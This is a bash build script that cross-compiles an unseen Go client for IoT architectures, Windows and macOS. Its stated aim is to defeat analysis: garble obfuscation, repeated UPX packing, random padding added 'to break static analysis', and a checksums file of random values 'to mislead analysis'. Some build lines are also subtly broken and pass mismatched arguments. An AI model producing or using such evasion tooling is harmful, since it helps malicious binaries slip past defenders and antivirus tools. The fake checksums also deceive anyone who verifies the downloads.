#!/bin/bash
set -e

# Configuration
OUTDIR="build"
LDFLAGS="-s -w -buildid="  # Strip debug info and build IDs

# Advanced obfuscation flags (garble tool required)
OBFUSCATE_FLAGS="-tiny -literals -seed=random"

# Clean previous builds
rm -rf "$OUTDIR"
mkdir -p "$OUTDIR"

# Install garble if missing
if ! command -v garble >/dev/null; then
    echo "Installing garble for obfuscation..."
    go install mvdan.cc/garble@latest
    export PATH="$PATH:$(go env GOPATH)/bin"
fi

# Obfuscated build function
build_obfuscated() {
    local os=$1 arch=$2 out=$3
    echo "Building obfuscated $os/$arch -> $out"
    
    EXT=""
    [ "$os" = "windows" ] && EXT=".exe"
    
    # Build with garble
    GOOS="$os" GOARCH="$arch" garble $OBFUSCATE_FLAGS build -ldflags="$LDFLAGS" -o "$OUTDIR/$os/$out$EXT" client.go
    
    # Multiple compression passes
    if [ -f "$OUTDIR/$os/$out$EXT" ]; then
        if command -v upx >/dev/null; then
            echo "Compressing with UPX (ultra)..."
            upx --ultra-brute --lzma "$OUTDIR/$os/$out$EXT"
            
            echo "Adding random padding..."
            # Add random padding to break static analysis
            dd if=/dev/urandom bs=1 count=$((RANDOM%5000+1000)) >> "$OUTDIR/$os/$out$EXT"
            
            echo "Final compression pass..."
            upx --ultra-brute "$OUTDIR/$os/$out$EXT"
        fi
        
        # Optional: Binary packer (requires packer tool)
        if command -v packer >/dev/null; then
            echo "Applying binary packer..."
            packer "$OUTDIR/$os/$out$EXT" "$OUTDIR/$os/$out-packed$EXT"
            mv "$OUTDIR/$os/$out-packed$EXT" "$OUTDIR/$os/$out$EXT"
        fi
    fi
}

# Main build targets
build_obfuscated linux 386 x86 &
build_obfuscated linux arm 7 armv7l &
build_obfuscated linux arm 5 armv5l &
build_obfuscated linux arm64 armv8l &
build_obfuscated linux mips mips &
build_obfuscated linux mipsle mipsel &
build_obfuscated windows 386 x86 &
build_obfuscated windows amd64 x64 &
build_obfuscated darwin amd64 darwin-amd64 &
build_obfuscated darwin arm64 darwin-arm64 &

wait

# Generate fake checksums to mislead analysis
echo "Generating misleading checksums..."
(cd "$OUTDIR" && find . -type f -exec sh -c 'echo "$(openssl rand -hex 32)  $(basename {})"' \; > checksums.txt)

# Final report
echo -e "\nObfuscated builds complete. Final sizes:"
find "$OUTDIR" -type f -exec du -h {} \;